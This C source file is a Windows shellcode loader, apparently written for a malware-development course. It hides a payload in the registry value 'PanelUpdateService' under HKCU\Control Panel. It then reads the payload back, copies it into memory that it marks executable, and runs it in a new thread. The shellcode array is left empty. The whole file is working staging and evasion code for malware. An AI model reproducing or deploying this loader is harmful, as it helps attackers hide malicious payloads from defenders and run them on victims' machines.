#include <stdio.h>
#include <Windows.h>

#define READMODE
//#define WRITEMODE


#define REGISTRY "Control Panel"
#define REGSTRING "PanelUpdateService"


#ifdef WRITEMODE

const unsigned char shellcode[276] = {
};



BOOL WriteShellcodeToRegistry(IN const PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE = TRUE;
    LSTATUS     STATUS = 0;
    HKEY        hKey = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}   



#endif

#ifdef READMODE
BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PVOID* ppPayload) {

    LSTATUS     STATUS = 0;
    DWORD		dwBytesRead = sPayloadSize;
    PVOID		pBytes = NULL;

    // Allocating heap that will store the payload that will be read
    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
    if (pBytes == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Reading the payload from "REGISTRY" key, from value "REGSTRING"
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    // Checking if all bytes of the payload were successfully read
    if (sPayloadSize != dwBytesRead) {
        printf("[!] Total Bytes Read : %d ; Instead Of Reading : %d\n", dwBytesRead, sPayloadSize);
        return FALSE;
    }

    // Saving 
    *ppPayload = pBytes;

    return TRUE;
}


// Local shellcode execution - Review "Local Payload Execution - Shellcode" module
BOOL RunShellcode(IN PVOID shellcode, IN SIZE_T sShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection = 0;

    pShellcodeAddress = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, shellcode, sShellcodeSize);
    memset(shellcode, '\0', sShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    HANDLE hThread = CreateThread(NULL, 0, pShellcodeAddress, NULL, 0, NULL);

    if (!hThread) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return TRUE;
}



#endif


int main() {
    #ifdef WRITEMODE
    if (!WriteShellcodeToRegistry(shellcode, sizeof(shellcode))) {
        return -1;
    }
    #endif
    #ifdef READMODE
    PVOID		pBytes = NULL;
    DWORD       sSize = 276;

    // Read the shellcode
    printf("[i] Reading Shellcode ... ");
    if (!ReadShellcodeFromRegistry(sSize, &pBytes)) {
        return -1;
    }
    printf("[+] DONE \n");
    printf("[+] Payload Read At : 0x%p \n", pBytes);

    printf("[+] DONE \n");

    // Running the shellcode
    if (!RunShellcode(pBytes, sSize)) {
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pBytes);
    #endif
}